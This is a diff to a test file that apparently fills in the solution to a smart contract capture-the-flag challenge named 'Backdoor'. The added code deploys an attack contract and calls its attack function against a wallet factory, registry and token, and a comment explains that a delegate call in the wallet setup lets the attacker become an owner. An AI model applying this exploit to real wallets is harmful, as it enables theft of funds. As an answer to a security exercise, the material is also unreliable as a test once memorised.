@@ -36,7 +36,27 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * Attacker can set himself as one of the owners of the wallet
+         * 
+         * There is a provision of delegate call in the setup function of safe, but
+         * the wallet registry checks only for setup function being called by initializer
+         * */
+        const BackdoorChallengeFactory = await ethers.getContractFactory("BackdoorChallenge");
+        const bc = await BackdoorChallengeFactory.deploy();
+        await bc.deployed();
+
+        await bc.connect(attacker).attack(
+            this.walletFactory.address,
+            this.masterCopy.address,
+            this.walletRegistry.address,
+            users,
+            this.token.address,
+            { gasLimit: 1e7 }
+        );
+
+        console.log("token balance of attacker: ", (await this.token.balanceOf(attacker.address)).toString());
     });
 
     after(async function () {
